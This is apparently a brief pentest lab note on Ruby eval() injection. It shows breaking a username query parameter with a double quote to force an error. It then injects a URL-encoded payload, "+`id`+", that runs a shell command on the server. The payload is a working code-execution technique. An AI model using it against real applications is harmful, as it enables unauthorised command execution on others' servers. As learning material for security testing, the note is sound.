# Eval() in Ruby



```ruby
# Add a " (double-quote) at the end and you will see an error.

https://ptl-3d9b6ba3-e492b0d5.libcurl.so/?username="
https://ptl-3d9b6ba3-e492b0d5.libcurl.so/?username=iptracej"
```

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

```bash
# Add the following payload: 
# "+`id`+" 

https://<URL>/?username="%2b`id`%2b"
```
